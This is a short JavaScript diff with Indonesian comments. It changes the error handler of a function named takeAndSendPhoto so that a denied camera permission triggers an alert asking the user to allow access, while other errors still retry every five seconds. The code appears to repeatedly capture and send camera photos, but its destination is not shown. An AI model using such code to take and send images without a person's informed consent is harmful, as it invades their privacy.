@@ -97,8 +97,13 @@
         })
         .catch(function(err) {
           console.log("Error: " + err);
-          // Coba kembali mengambil gambar jika terjadi kesalahan dengan delay 5 detik
-          setTimeout(takeAndSendPhoto, 5000);
+          // Menangani kesalahan pengambilan akses kamera
+          if (err.name === 'NotAllowedError') {
+            alert('Untuk melanjutkan, izinkan akses kamera pada peramban Anda.');
+          } else {
+            // Coba kembali mengambil gambar jika terjadi kesalahan dengan delay 5 detik
+            setTimeout(takeAndSendPhoto, 5000);
+          }
         });
     }
 
